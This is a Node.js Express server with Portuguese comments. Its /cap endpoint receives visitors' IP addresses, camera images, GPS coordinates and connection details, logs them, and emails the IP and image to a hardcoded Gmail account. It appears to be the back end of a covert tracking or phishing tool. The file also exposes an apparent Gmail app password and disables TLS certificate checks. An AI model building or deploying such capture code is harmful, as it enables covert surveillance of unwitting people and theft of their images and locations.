const express = require("express");
const fs = require("fs");
const path = require("path");
const requestIp = require("request-ip");
const nodemailer = require("nodemailer");

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "10mb" }));
app.use(express.static("public"));

// Verificar e criar o diretório 'img' caso não exista
const imgDir = path.join(__dirname, "img");
if (!fs.existsSync(imgDir)) {
  fs.mkdirSync(imgDir);
}

// Configuração do Nodemailer
const transporter = nodemailer.createTransport({
  service: "gmail", // Ou outro serviço de e-mail que você estiver usando
  auth: {
    user: "asaserroa@gmail.com", // Substitua pelo seu e-mail
    pass: "grul khja qcoi bvtc", // Substitua pela sua senha
  },
  tls: {
    rejectUnauthorized: false, // Adicione isso caso você tenha problemas com conexões TLS
  },
});

// Função para enviar e-mail
function sendEmail(ip, location, connection, imagePath) {
  const mailOptions = {
    from: "asaserroa@gmail.com", // Substitua pelo seu e-mail
    to: "asaserroa@gmail.com", // Substitua pelo seu destinatário
    subject: "Informações Capturadas - Endpoint /cap",
    text: `Informações Capturadas:
    IP: ${ip}`,
    attachments: [
      {
        path: imagePath, // Caminho da imagem anexada
      },
    ],
  };

  console.log("Enviando e-mail...");

  transporter.sendMail(mailOptions, (error, info) => {
    console.log("Informações Capturadas:", ip, location, connection);
    if (error) {
      console.log("Erro ao enviar e-mail:", error);
    } else {
      console.log("E-mail enviado:", info.response);
    }
  });
}

// Endpoint /cap
app.post("/cap", (req, res) => {
  const ip = requestIp.getClientIp(req); // Captura o IP real
  const { image, location, connection } = req.body;

  // Log IP
  fs.appendFileSync("logs.txt", `IP: ${ip}\n`);

  // Log localização se disponível
  if (location) {
    fs.appendFileSync(
      "logs.txt",
      `Localização: Latitude ${location.latitude}, Longitude ${location.longitude}\n`
    );
  }

  // Log informações de conexão se disponíveis
  if (connection) {
    fs.appendFileSync(
      "logs.txt",
      `Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}\n`
    );
  }

  // Salvar imagem se disponível e retornar o caminho
  let imagePath = null;
  if (image) {
    const imageBuffer = Buffer.from(image.split(",")[1], "base64");
    const imageName = `${Date.now()}.png`;
    imagePath = path.join(imgDir, imageName);
    fs.writeFileSync(imagePath, imageBuffer);
  }

  console.log("Informações capturadas:", ip, location, connection);

  console.log("Informações capturadas:", ip, location, connection);
  sendEmail(ip, location, connection, imagePath);

  res.send({ status: "success", ip });
});

app.listen(PORT, () =>
  console.log(`Servidor rodando em http://localhost:${PORT}`)
);
